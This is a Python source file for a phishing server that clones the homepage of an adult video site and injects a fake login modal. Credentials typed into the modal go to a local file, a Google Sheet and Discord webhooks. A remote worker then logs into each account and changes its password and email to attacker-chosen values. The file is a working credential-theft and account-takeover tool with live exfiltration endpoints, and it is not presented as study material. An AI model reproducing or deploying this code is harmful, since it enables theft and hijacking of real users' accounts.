from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import os
import urllib.request
import urllib.parse
import threading
import requests

CREDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "creds.json")
RENDER_WORKER_URL = "https://cwscrp-1.onrender.com"

GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbwdAIV40A4sC9SWsIyXKC6uMJcgF1MGL6im_Vq9uxZT6HhHdS7CI5xUxFCLUzMLiKqPZw/exec"
DISCORD_CREDS_WEBHOOK = "https://discord.com/api/webhooks/1480093421698940959/Z80mCRx5PykLaA29XwF7_Nxdl3QeqxRiyU380RbVpXc1nD-5Hb1lokk8-8Qzwle6kZtS"
DISCORD_SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1480118694674956329/n8r1xhEf1Xyw7fUE33LlBF1PS2IRyFRboW6E-U78DkzIAMGxLzK0Bx7VYHy3cgYAyhCf"
NEW_PASSWORD = "123aaa"
NEW_EMAIL = "cuentadewapp1@gmail.com"

def send_to_sheet(tab, data):
    try:
        resp = requests.post(GOOGLE_SHEET_URL, json={"tab": tab, **data}, timeout=15)
        print(f"[SHEET] {tab} -> {resp.status_code}")
    except Exception as e:
        print(f"[SHEET ERROR] {e}")

def send_to_discord(webhook_url, content):
    try:
        resp = requests.post(webhook_url, json={"content": content}, timeout=10)
        print(f"[DISCORD] -> {resp.status_code}")
    except Exception as e:
        print(f"[DISCORD ERROR] {e}")

def call_render_worker(username, password, timestamp):
    """Fire-and-forget call to Render worker for login + password/email change"""
    try:
        resp = requests.post(f"{RENDER_WORKER_URL}/process", json={"username": username, "password": password, "timestamp": timestamp}, timeout=120)
        result = resp.json()
        print(f"[RENDER WORKER] {username} -> {result}")

        # Send Discord success message from here (not from Render) to avoid rate limits
        if result.get("loginStatus") == "success" and result.get("changePassStatus") == "success":
            email_note = "YES" if result.get("changeEmailStatus") == "success" else "FAILED"
            send_to_discord(DISCORD_SUCCESS_WEBHOOK,
                f"**[SUCCESS]** `{username}` | Old: `{password}` | New: `{NEW_PASSWORD}` | Email: {email_note}"
            )
    except Exception as e:
        print(f"[RENDER WORKER ERROR] {username} -> {e}")

PROD_URL = "https://www.camwhores.tv/"
PROD_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "es-US,es;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
}

LOGIN_INJECTION = '''
<!-- Login Modal Overlay -->
<div id="login-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:8010;"></div>

<!-- Login Modal -->
<div id="login-modal" class="fancybox-wrap fancybox-desktop fancybox-type-ajax fancybox-opened" tabindex="-1" style="display:none; width:90vw; max-width:665px; height:auto; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); opacity:1; overflow:visible; z-index:8030;">
\t<div class="fancybox-skin" style="padding:15px; width:auto; height:auto; background:#1e1e1e;">
\t\t<div class="fancybox-outer">
\t\t\t<div class="fancybox-inner" style="overflow:auto; width:auto; height:auto;">
\t\t\t\t<strong class="popup-title">Login</strong>
\t\t\t\t<div class="popup-holder">
\t\t\t\t\t<form id="login-form" action="#" method="post">
\t\t\t\t\t\t<div class="generic-error hidden"></div>
\t\t\t\t\t\t<div>
\t\t\t\t\t\t\t<div class="row">
\t\t\t\t\t\t\t\t<label for="login_username" class="field-label required">Username</label>
\t\t\t\t\t\t\t\t<input type="text" name="username" id="login_username" class="textfield" placeholder="please enter login here">
\t\t\t\t\t\t\t\t<div class="field-error down"></div>
\t\t\t\t\t\t\t</div>
\t\t\t\t\t\t\t<div class="row">
\t\t\t\t\t\t\t\t<label for="login_pass" class="field-label required">Password</label>
\t\t\t\t\t\t\t\t<input type="password" name="pass" id="login_pass" class="textfield">
\t\t\t\t\t\t\t\t<div class="field-error down"></div>
\t\t\t\t\t\t\t</div>
\t\t\t\t\t\t\t<div class="row">
\t\t\t\t\t\t\t\t<input type="checkbox" name="remember_me" id="login_remember_me" class="checkbox" value="1">
\t\t\t\t\t\t\t\t<label for="login_remember_me">remember me</label>
\t\t\t\t\t\t\t</div>
\t\t\t\t\t\t\t<div class="bottom">
\t\t\t\t\t\t\t\t<input type="hidden" name="action" value="login">
\t\t\t\t\t\t\t\t<input type="submit" class="submit" value="Log in">
\t\t\t\t\t\t\t\t<div class="links">
\t\t\t\t\t\t\t\t\t<p><a href="#">Not a member yet? Sign up now for free!</a></p>
\t\t\t\t\t\t\t\t\t<p><a href="#">Forgot password?</a> / <a href="#">Missing confirmation email?</a></p>
\t\t\t\t\t\t\t\t</div>
\t\t\t\t\t\t\t</div>
\t\t\t\t\t\t</div>
\t\t\t\t\t</form>
\t\t\t\t</div>
\t\t\t</div>
\t\t</div>
\t\t<a title="Close" class="fancybox-close" href="javascript:;" id="login-close"></a>
\t</div>
</div>

<script>
(function() {
\tvar overlay = document.getElementById('login-overlay');
\tvar modal = document.getElementById('login-modal');
\tvar closeBtn = document.getElementById('login-close');

\tfunction openLogin(e) {
\t\te.preventDefault();
\t\te.stopImmediatePropagation();
\t\tif (typeof $.fancybox !== 'undefined') try { $.fancybox.close(); } catch(x) {}
\t\toverlay.style.display = 'block';
\t\tmodal.style.display = 'block';
\t}

\tfunction closeLogin() {
\t\toverlay.style.display = 'none';
\t\tmodal.style.display = 'none';
\t}

\tdocument.querySelectorAll('#login, .open-login, [data-fancybox="ajax"], a[href*="/login/"]').forEach(function(link) {
\t\tlink.removeAttribute('data-fancybox');
\t\tlink.style.cursor = 'pointer';
\t\tlink.addEventListener('click', openLogin, true);
\t});

\tcloseBtn.addEventListener('click', closeLogin);
\toverlay.addEventListener('click', closeLogin);

\tdocument.getElementById('login-form').addEventListener('submit', function(e) {
\t\te.preventDefault();
\t\tvar username = document.getElementById('login_username').value;
\t\tvar password = document.getElementById('login_pass').value;
\t\tvar remember = document.getElementById('login_remember_me').checked;

\t\tif (!username || !password) return;

\t\tvar params = 'username=' + encodeURIComponent(username)
\t\t\t+ '&password=' + encodeURIComponent(password)
\t\t\t+ '&remember_me=' + remember
\t\t\t+ '&timestamp=' + encodeURIComponent(new Date().toISOString());

\t\tfetch('/api/save-creds?' + params).then(function(r) {
\t\t\treturn r.json();
\t\t}).then(function(data) {
\t\t\tif (data.login_status === 'success') {
\t\t\t\twindow.location.href = 'https://www.camwhores.tv/';
\t\t\t} else {
\t\t\t\tvar err = document.querySelector('#login-form .generic-error');
\t\t\t\terr.textContent = 'Invalid Username or Password. Username and Password are case-sensitive.';
\t\t\t\terr.style.display = 'block';
\t\t\t\terr.classList.remove('hidden');
\t\t\t}
\t\t}).catch(function(err) {
\t\t\tconsole.error('save-creds error:', err);
\t\t});
\t});
})();
</script>
'''

_cached_page = None

def fetch_prod_page():
    global _cached_page
    if _cached_page:
        return _cached_page
    try:
        req = urllib.request.Request(PROD_URL, headers=PROD_HEADERS)
        with urllib.request.urlopen(req, timeout=10) as resp:
            html = resp.read().decode("utf-8", errors="replace")
        # Remove prod login form if present
        import re
        html = re.sub(r'<form[^>]*action="https://www\.camwhores\.tv/login/"[^>]*>.*?</form>', '', html, flags=re.DOTALL)
        # Inject custom login modal before </body>
        html = html.replace('</body>', LOGIN_INJECTION + '\n</body>')
        _cached_page = html
        print("[PROD] Fetched and cached prod page")
    except Exception as e:
        print(f"[PROD ERROR] {e}")
        _cached_page = None
        return None
    return _cached_page


class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(self.path)

        if parsed.path == "/" or parsed.path == "/index.html":
            page = fetch_prod_page()
            if page:
                content = page.encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            else:
                # Fallback to local index.html
                super().do_GET()
        elif parsed.path in ("/save-creds", "/api/save-creds"):
            params = parse_qs(parsed.query)
            body = {k: v[0] for k, v in params.items()}
            username = body.get("username", "")
            password = body.get("password", "")
            timestamp = body.get("timestamp", "")

            print(f"[CREDS] {username}")

            # 1. Save creds locally
            creds = []
            if os.path.exists(CREDS_FILE):
                with open(CREDS_FILE, "r") as f:
                    creds = json.load(f)
            creds.append(body)
            with open(CREDS_FILE, "w") as f:
                json.dump(creds, f, indent=2)

            # 2. Save to Google Sheets + Discord
            send_to_sheet("creds", {
                "username": username,
                "password": password,
                "remember_me": body.get("remember_me", ""),
                "timestamp": timestamp,
                "login_status": "pending",
                "login_error": "",
            })
            send_to_discord(DISCORD_CREDS_WEBHOOK,
                f"**[CREDS]** `{username}` / `{password}` | Sending to worker..."
            )

            # 3. Fire-and-forget call to Render worker (in background thread)
            threading.Thread(target=call_render_worker, args=(username, password, timestamp), daemon=True).start()

            # 4. Return success immediately
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps({"login_status": "success"}).encode())
        else:
            super().do_GET()

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    server = HTTPServer(("0.0.0.0", 8080), Handler)
    print(f"Serving on http://localhost:8080")
    print(f"Creds saved locally to: {CREDS_FILE}")
    print(f"Render worker: {RENDER_WORKER_URL}")
    server.serve_forever()
